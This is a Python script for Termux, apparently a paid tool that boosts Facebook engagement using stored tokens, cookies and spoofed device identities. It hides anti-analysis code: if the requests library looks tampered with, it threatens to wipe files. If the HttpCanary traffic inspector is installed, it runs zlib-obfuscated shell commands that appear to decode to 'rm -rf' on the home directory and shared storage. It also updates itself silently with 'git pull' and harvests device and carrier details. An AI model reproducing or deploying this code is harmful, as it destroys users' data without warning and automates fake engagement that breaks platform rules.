#!/usr/bin/python3
#coding=utf-8
#CODE BY ARTHUR KEITH GRAYSON
#AUTO BOOSTING TOOL IN TERMUX
#FACEBOOK : https://www.facebook.com/Arthur.Keith.Grayson.IAmLimitless
import requests
import json
import os
import re
import random
import os
import time
import logging
import requests
import os,requests,json,time,re,random,sys,uuid,string,subprocess
from string import ascii_lowercase, ascii_uppercase, digits
import shutil
import os, requests, re,platform, sys, random, subprocess, threading, itertools,base64,uuid,zlib,re,json,uuid,subprocess,shutil,webbrowser,time,json,sys,random,datetime,time,re,subprocess,platform,string,json,time,re,random,sys,string,uuid
import os, platform
import requests,bs4,json,os,sys,random,datetime,time,re,string
import urllib3,rich,base64
import mechanize
import concurrent.futures
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,getpass,mechanize,requests
import os,base64,zlib,pip,urllib,urllib3, sys, re, requests, time, random, json, string
import os,requests,json,time,re,random,sys,uuid,string,subprocess
import requests
import os, platform, time, sys
import re
import uuid
import random
import os
import time
import threading
import json
import base64
import platform
import logging
import os,json,re,sys
import threading,base64
import os,time,re,json,random
import datetime
import requests,random,uuid,string,hashlib,json
import os,uuid,base64,requests,zlib,httpx,time,platform,datetime
import os,base64,zlib,pip,urllib,urllib3
import platform,math,smtplib
import platform
import smtplib
import math
import os,base64,zlib,pip,urllib
import requests
import re, bs4, requests, sys, os, random, json, time, datetime
import os,uuid,base64,requests,zlib,httpx,time,platform,datetime
import requests
import random
import threading
import json
import base64
import platform
import logging
import shutil
import requests
import os,base64,zlib,pip,urllib,platform,math,shutil,random,uuid,string,hashlib,json,sys,uuid,getpass
import os,base64,zlib,pip,urllib
import os,zlib,time,datetime
import os
import re
import sys
import time
import json
import random
import datetime
import requests
import sys
import os
import requests
import threading
import time
import os
import requests
import re
import platform
import sys
import random
import subprocess
import threading
import itertools
import base64
import uuid
import zlib
import re
import json
import uuid
import subprocess
import shutil
import webbrowser
import time
import json
import sys
import random
import datetime
import time
import re
import subprocess
import platform
import string
import json
import time
import re
import random
import sys
import string
import uuid
import requests
import os,base64,zlib,pip,urllib,urllib3
import platform,math,smtplib
import platform
import smtplib
import math
import mahdix
import os,base64,zlib,pip,urllib
from os import path
from os import system as sm
from time import sleep as sp
from sys import platform as pf
from rich import print as rich_print
from colorama import Fore, Style, init
from datetime import datetime
from bs4 import BeautifulSoup
from urllib.request import urlopen
from os import system as osRUB
from os import system as cmd
from time import sleep,strftime
from time import sleep
from requests import api
from urllib3 import connection
from urllib import request
from requests import sessions
from requests import models
from requests import utils
from requests import adapters
from requests import cookies
from requests import compat
from requests import hooks
from requests import exceptions
from requests import certs
from requests import structures
from requests import auth
from requests import packages
from urllib.request import parse_http_list
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as bsp
from bs4 import BeautifulSoup as bsp
from string import *
from random import randint
from time import sleep as slp
from os import system as cmd
from zlib import decompress
from time import sleep as sp
from time import localtime as lt
from urllib.request import urlopen
from atexit import register
from time import sleep
from time import sleep,strftime
from concurrent.futures import ThreadPoolExecutor as MrXIDI
from string import *
from random import randint
from time import sleep as slp
from os import system as cmd
from zlib import decompress
from concurrent.futures import ThreadPoolExecutor, as_completed
from concurrent.futures import ThreadPoolExecutor as loda
from bs4 import BeautifulSoup
from time import strftime
from time import localtime as lt
from concurrent.futures import ThreadPoolExecutor as loda
from bs4 import BeautifulSoup
from time import strftime
from os import path
from urllib.request import urlopen
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import pretty
from rich.text import Text as tekz
from time import localtime as lt
from concurrent.futures import ThreadPoolExecutor
from urllib.error import URLError
from concurrent.futures import ThreadPoolExecutor as threadspeed
from requests.exceptions import ConnectionError
from time import sleep
first="/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/"
sec=requests.Session()
ses=requests.Session()

W = '\033[97;1m'
R = '\033[91;1m'
G = '\033[92;1m'
Y = '\033[93;1m'
B = '\033[94;1m'
P = '\033[95;1m'
S = '\033[96;1m'
N = '\x1b[0m'
LI_YELLOW = '\033[93m'
LI_GREEN = '\033[92m'
NOTE = '\x1b[38;5;203m'
PURPLE ='\x1b[38;5;46m'
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\x1b[38;5;46m'
YELLOW = '\033[1;33m'
magenta = '\033[1;34m'
ORANGE = '\033[1;35m'
BLACK ="\033[1;30m"
EXTRA ='\x1b[38;5;208m'
CYAN ='\033[1;96m'
red = '\x1b[1;31m'
green = '\x1b[1;32m'
yellow = '\x1b[1;33m'
blue = '\x1b[1;34m'
cyan = '\x1b[1;36m'
white = '\x1b[1;37m'
black = '\x1b[1;30m'
magenta = '\x1b[1;35m'
grey = '\x1b[1;90m'
orange = '\x1b[1;91m'
lime = '\x1b[1;92m'
sky_blue = '\x1b[1;94m'
purple = '\x1b[1;95m'
turquoise = '\x1b[1;96m'
c = '\033[1;96m'
w = '\033[1;97m'
wh = '\033[1;97m'
reset = '\033[0m'
r = '\033[0m'

os.system('clear')
bit = platform.architecture()[0]
if bit == '64bit':
 print(f'YOU ARE 64BIT USER')
 time.sleep(4)
elif bit == '32bit':
 print(f'YOU ARE 32BIT USER')

def clr():
    try:
        data = os.listdir('/sdcard')
        if 'Android' in data:
            print(f'{red}「!」 ALL YOUR FILES WILL REMOVE IF YOU TRY AGAIN! ');exit()
        else:exit()
    except:exit()

from requests import api
x = open(api.__file__, 'r').read()
if 'print' in x:
    clr()
if 'marshal' in x:
    clr()
if 'lambda' in x:
    clr()
if 'lzma' in x:
    clr()
if 'gzip' in x:
    clr()
if 'bz2' in x:
    clr()
if 'binascii' in x:
    clr()
if 'zlib' in x:
    clr()
if 'exec' in x:
    clr()
if 'base64' in x:
    clr()
if 'base32' in x:
    clr()
if 'decompress' in x:
    clr()
if 'std' in x:
    clr()
if 'x =' in x:
    clr()
if 'x=' in x:
    clr()
if 'console' in x:
    clr()
if 'puts' in x:
    clr()
if 'fmt' in x:
    clr()
if 'disp' in x:
    clr()
if 'sys.stdout.write' in x:
    clr()
if 'open().write' in x:
    clr()
if 'write' in x:
    clr()
if 'logging.info' in x:
    clr()
if 'logging' in x:
    clr()
if 'printf' in x:
    clr()
if 'echo' in x:
    clr()
if 'os.system' in x:
    clr()
if 'system' in x:
    clr()
if '(url)' in x:
    clr()
if '{url}' in x:
    clr()
if '(data)' in x:
    clr()
if '{data}' in x:
    clr()
if '(headers)' in x:
    clr()
if 'DR4X' in x:
    clr()
if '{headers}' in x:
    clr()
from requests import sessions
x = open(sessions.__file__, 'r').read()
if 'print' in x:
    clr()
if 'marshal' in x:
    clr()
if 'lambda' in x:
    clr()
if 'lzma' in x:
    clr()
if 'gzip' in x:
    clr()
if 'bz2' in x:
    clr()
if 'binascii' in x:
    clr()
if 'zlib' in x:
    clr()
if 'exec' in x:
    clr()
if 'base64' in x:
    clr()
if 'base32' in x:
    clr()
if 'decompress' in x:
    clr()
if 'sdcard' in x:
    clr()
if "60*'='" in x:
    clr()
if "60 * '='" in x:
    clr()
if "'='" in x:
    clr()
if 'std' in x:
    clr()
if 'x =' in x:
    clr()
if 'x=' in x:
    clr()
if 'console' in x:
    clr()
if 'puts' in x:
    clr()
if 'fmt' in x:
    clr()
if 'sys.stdout.write' in x:
    clr()
if 'open().write' in x:
    clr()
if 'open' in x:
    clr()
if 'write' in x:
    clr()
if 'logging.info' in x:
    clr()
if 'logging' in x:
    clr()
if 'printf' in x:
    clr()
if 'open' in x:
    clr()
if 'echo' in x:
    clr()
if 'str(data)' in x:
    clr()
if 'str(headers)' in x:
    clr()
if 'str(url)' in x:
    clr()
if 'd(url)' in x:
    clr()
if 'c(url)' in x:
    clr()
if 'b(url)' in x:
    clr()
if 'a(url)' in x:
    clr()
if 'f(url)' in x:
    clr()
if 'j(url)' in x:
    clr()
if 'k(url)' in x:
    clr()
if 'l(url)' in x:
    clr()
if 'm(url)' in x:
    clr()
if 'n(url)' in x:
    clr()
if 'o(url)' in x:
    clr()
if 'p(url)' in x:
    clr()
if 'q(url)' in x:
    clr()
if 's(url)' in x:
    clr()
if 'r(url)' in x:
    clr()
if 't(url)' in x:
    clr()
if 'u(url)' in x:
    clr()
if 'v(url)' in x:
    clr()
if 'z(url)' in x:
    clr()
if 'y(url)' in x:
    clr()
if 'x(url)' in x:
    clr()
if 'w(url)' in x:
    clr()
if '((url)' in x:
    clr()
if '+url' in x:
    clr()
if '{url}' in x:
    clr()
if '(data)' in x:
    clr()
if '{data}' in x:
    clr()
if '(headers)' in x:
    clr()
if 'DR4X' in x:
    clr()
if '{headers}' in x:
    clr()
from requests import models
x = open(models.__file__, 'r').read()
if 'print' in x:
    clr()
if 'marshal' in x:
    clr()
if 'aaaaaaaarthur07' in x:
    clr()
if 'ARTHUR' in x:
    clr()
if 'if self.url' in x:
    clr()
if 'lambda' in x:
    clr()
if 'lzma' in x:
    clr()
if 'gzip' in x:
    clr()
if 'bz2' in x:
    clr()
if 'binascii' in x:
    clr()
if 'zlib' in x:
    clr()
if 'exec' in x:
    clr()
if 'base64' in x:
    clr()
if 'base32' in x:
    clr()
if 'decompress' in x:
    clr()
if 'sys.stdout.write' in x:
    clr()
if 'blob' in x:
    clr()
if '.txt' in x:
    clr()
if 'x =' in x:
    clr()
if 'x=' in x:
    clr()
if 'approvalSheet' in x:
    clr()
if 'approval' in x:
    clr()
if 'console' in x:
    clr()
if 'puts' in x:
    clr()
if 'fmt' in x:
    clr()
if 'disp' in x:
    clr()
if 'open().write' in x:
    clr()
if 'write' in x:
    clr()
if 'open' in x:
    clr()
if 'logging.info' in x:
    clr()
if 'printf' in x:
    clr()
if 'echo' in x:
    clr()
if 'system' in x:
    clr()
if 'M4786==' in x:
    clr()
if 'M1107==' in x:
    clr()
if 'os.system' in x:
    clr()
if 'd(url)' in x:
    clr()
if 'c(url)' in x:
    clr()
if 'b(url)' in x:
    clr()
if 'a(url)' in x:
    clr()
if 'f(url)' in x:
    clr()
if 'j(url)' in x:
    clr()
if 'k(url)' in x:
    clr()
if 'm(url)' in x:
    clr()
if 'o(url)' in x:
    clr()
if 'p(url)' in x:
    clr()
if 'q(url)' in x:
    clr()
if 's(url)' in x:
    clr()
if 'e(url)' in x:
    clr()
if 'g(url)' in x:
    clr()
if 'h(url)' in x:
    clr()
if 'i(url)' in x:
    clr()
if 't(url)' in x:
    clr()
if 'u(url)' in x:
    clr()
if 'v(url)' in x:
    clr()
if 'z(url)' in x:
    clr()
if 'y(url)' in x:
    clr()
if 'x(url)' in x:
    clr()
if 'w(url)' in x:
    clr()
if '((url)' in x:
    clr()
if '+url' in x:
    clr()
if '{data}' in x:
    clr()
if 'str(data)' in x:
    clr()
if 'str(headers)' in x:
    clr()
if 'DR4X' in x:
    clr()
if '{headers}' in x:
    clr()

try:
        a = "anar"
        t="tt"
        fileee = os.listdir(zlib.decompress(b'x\x9c\xd3/NIN,J\xd1w\xccK)\xca\xcfL\xd1OI,I\xd4\x07\x00SL\x07\x89'))
        if f'com.h{t}pc{a}y.pro' in fileee:
                print(f'{red}FIRST UNINSTALL HTTPCANARY APK FOR RUN TOOLS')
                os.system(zlib.decompress(b'x\x9cKNQP\xf1\xf0w\xf5UPSS(\xcaU\xd0-JS\xd0\x02\x005\xfe\x05\x0f'))
                os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/NIN,J\xd1\xd7\x02\x00,D\x05\x1e'))
                os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/.\xc9/JLO\xd5O\xcd-\xcdI,IM\xd17\xd0\xd7\x02\x00\x8dJ\t\x81'))
                exit()
        else:pass
except Exception as e:
                pass

def check_install_requests():
    try:
        import requests
    except ModuleNotFoundError:
        os.system('pip uninstall requests chardet urllib3 idna certifi -y; pip install chardet urllib3 idna certifi requests')

check_install_requests()

try:
    os.system('clear')
    print("\033[1;37mCHECKING UPDATED....")
    time.sleep(3)
    os.system("git pull > /dev/null 2>&1")
except:
    pass

def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)

def arthurpogi(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)

#Removed Delete Storage

class FirebaseHandler:

    def __init__(self, database_url):
        self.database_url = database_url
        self.user_last_message_time = { }

    def is_spam(self, user):
        max_time_interval = 2
        current_time = time.time()
        if user in self.user_last_message_time:
            elapsed_time = current_time - self.user_last_message_time[user]
            return elapsed_time < max_time_interval

    def send_message(self, group_name, user, message):
        if not self.is_spam(user):
            self.user_last_message_time[user] = time.time()
            timestamp = int(time.time() * 1000)
            data = {
                'user': user,
                'message': message,
                'timestamp': timestamp }
            url = f'''{self.database_url}/groups/{group_name}.json'''
            response = requests.post(url, json = data)
            if response.status_code != 200:
                return None
            return None
        print('SPAM NOT ALLOWED (CAN SEND ONLY 1 MESSAGE IN 2 SECONDS)')

    def get_messages(self, group_name):
        url = f'''{self.database_url}/groups/{group_name}.json'''
        response = requests.get(url)
        if response.status_code == 200:
            return response.json()

def listen_for_messages(firebase_handler, group_name):
    processed_messages = set()
    group_messages = firebase_handler.get_messages(group_name)
    if group_messages:
        for key, message in group_messages.items():
            if key not in processed_messages:
                timestamp = message.get('timestamp', '')
                print(f'''\r{GREEN}{message['user']} : {message['message']}\r''')
                processed_messages.add(key)
            time.sleep(1)

firebase_url = 'https://login-page-arthub-boosting-default-rtdb.firebaseio.com'
firebase_handler = FirebaseHandler(firebase_url)
group_name = 'CHAT_GROUP'

def clear_line():
    sys.stdout.write('\x1b[F\x1b[K')

ua_default = 'Mozilla/5.0 (Linux; Android 3.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.66 Mobile Safari/537.36'
ua_samsung = 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'
ua_nokia   = 'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_oppo    = 'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_vivo    = 'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_iphone  = 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Mobile/15E148 Safari/604.1'
ua_asus    = 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_lenovo  = 'Mozilla/5.0 (Linux; U; Android 5.0.1; ru-RU; Lenovo A788t Build/LRX22C) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.3.0.950 U3/0.8.0 Mobile Safari/E7FBAF'
ua_huawei  = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_windows = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_chrome  = 'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Mobile Safari/537.36'
ua_fb      = 'Mozilla/5.0 (Linux; Android 8.0.0; RNE-L21 Build/HUAWEIRNE-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/360.0.0.30.113;]'
ua_random = random.choice([ua_default,ua_samsung,ua_nokia,ua_xiaomi,ua_oppo,ua_vivo,ua_iphone,ua_asus,ua_lenovo,ua_huawei,ua_windows,ua_chrome,ua_fb])

def W_ueragnt():
    chrome_version = random.randint(80, 99)
    webkit_version = random.randint(500, 599)
    safari_version = random.randint(400, 499)
    windyows_version = random.randint(8, 10)
    is_win64 = random.choice([True,False])
    if is_win64:
        if not 'WOW64;':
            user_agent = f'''Mozilla/5.0 (Windows NT {windows_version}.{''}Win64; x64) AppleWebKit/{webkit_version}.0 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Safari/{safari_version}.0'''
            return user_agent

headers = {
    'user-agent': W_ueragnt(),
    'viewport-width': '847',
    'x-asbd-id': '129477',
    'x-fb-friendly-name': 'GroupCometJoinForumMutation',
    'x-fb-lsd': 'wGh6ACr3OJ2v2rPBdXy-1o'}
headersccc = {
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
    'viewport-width': '546',
    'x-asbd-id': '129477',
    'x-fb-friendly-name': 'CometProfilePlusLikeMutation',
    'x-fb-lsd': 'KA9qtqSd7hV8150DnYqqmy'}

hedars_golba = {
'authority': 'www.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'en-US,en;q=0.9,id;q=0.8,bn;q=0.7','cache-control': 'max-age=0','dpr': '1','sec-ch-prefers-color-scheme': 'light',
'sec-ch-ua': '"Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"',
'sec-ch-ua-full-version-list': '"Chromium";v="118.0.5993.117", "Google Chrome";v="118.0.5993.117", "Not=A?Brand";v="99.0.0.0"','sec-ch-ua-mobile': '?0','sec-ch-ua-model': '""','sec-ch-ua-platform': '"Windows"','sec-ch-ua-platform-version': '"15.0.0"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent':W_ueragnt(),'viewport-width': '455',}

hedars_grapql={ 'authority': 'www.facebook.com',
'accept': '*/*','accept-language': 'en-US,en;q=0.9,id;q=0.8,bn;q=0.7','content-type': 'application/x-www-form-urlencoded','dpr': '1','origin': 'https://www.facebook.com','referer': 'https://www.facebook.com/groups/1944912799181203/permalink/2045697582436057/?mibextid=oMANbw','sec-ch-prefers-color-scheme': 'light','sec-ch-ua': '"Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"','sec-ch-ua-full-version-list': '"Chromium";v="118.0.5993.117", "Google Chrome";v="118.0.5993.117", "Not=A?Brand";v="99.0.0.0"','sec-ch-ua-mobile': '?0','sec-ch-ua-model': '""','sec-ch-ua-platform': '"Windows"','sec-ch-ua-platform-version': '"15.0.0"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-origin','user-agent': W_ueragnt(),'viewport-width': '752','x-asbd-id': '129477','x-fb-friendly-name': 'useGroupRemovePostAsAdminMutation','x-fb-lsd': 'RiDxK9cbLXTaMyAzkOl9Gx',}

import os

folder_name = "/sdcard/ARTHUR-RPW-BOOSTING"
file_names = ["toka.txt", "tokaid.txt", "tokp.txt", "tokpid.txt", "tokfra.json", "tokrpw.json", "cok.txt", "cokid.txt"]

def count_lines(file_path):
    try:
        with open(file_path, 'r') as file:
            return sum(1 for line in file)
    except FileNotFoundError:
        return 0

def linktradio(post_link):
    def extract_postid_from_link(post_link):
        pattern = r'https://www\.facebook\.com/\d+/posts/(\d+)/?'
        match = re.match(pattern, post_link)
        if match:
            return match.group(1)
        else:
            return None

    def convert_to_traodoisub(url):
        try:
            response = requests.post('https://id.traodoisub.com/api.php', data={'link': url})
            if response.status_code == 200:
                result = response.json().get('id')
                return result
            else:
                return None
        except Exception as e:
            print(f'AN ERROR OCCURRED: {e}')
            return None
    if re.search(r'/posts/\d+', post_link):
        post_id = extract_postid_from_link(post_link)
        if post_id:
            return post_id
    elif 'pfbid' in post_link:
        post_id = convert_to_traodoisub(post_link)
        if post_id:
            return post_id
    return 'INVALID LINK FORMAT OR UNABLE TO PROCESS THE LINK.'

sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_GB'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'SMART'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.0,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "SMART"
                        sim_id+=fbcr
        else:
                fbcr = 'SMART'
                sim_id+=fbcr
except:
        fbcr = "SMART"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}


sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_GB'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'TNT'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.0,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "TNT"
                        sim_id+=fbcr
        else:
                fbcr = 'TNT'
                sim_id+=fbcr
except:
        fbcr = "TNT"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}


sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_GB'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'GLOBE'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.0,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "GLOBE"
                        sim_id+=fbcr
        else:
                fbcr = 'GLOBE'
                sim_id+=fbcr
except:
        fbcr = "GLOBE"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}

sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_GB'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'TM'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.0,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "TM"
                        sim_id+=fbcr
        else:
                fbcr = 'TM'
                sim_id+=fbcr
except:
        fbcr = "TM"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}

def logo():
    os.system('clear')
    print(f"""
{magenta}╭────────────────────────────────────────────────────────────╮
{magenta}│{green}             WELCOME TO ARTHUR BOOSTING TOOL                {magenta}│
{magenta}╰────────────────────────────────────────────────────────────╯
{magenta}╭────────────────────────────────────────────────────────────╮
{magenta}│{green}                     ╔═╗╦═╗╔╦╗╦ ╦╦ ╦╦═╗                     {magenta}│
{magenta}│{green}                     ╠═╣╠╦╝ ║ ╠═╣║ ║╠╦╝                     {magenta}│
{magenta}│{green}                     ╩ ╩╩╚═ ╩ ╩ ╩╚═╝╩╚═                     {magenta}│
{magenta}╰────────────────────────────────────────────────────────────╯
{magenta}╭────────────────────────────────────────────────────────────╮
{magenta}│{WHITE}AUTHOR       : ARTHUR KEITH GRAYSON                         {magenta}│
{magenta}│{WHITE}FACEBOOK     : https://www.facebook.com/100093158367736     {magenta}│
{magenta}│{WHITE}TOOL         : PAID/PREMIUM                                 {magenta}│
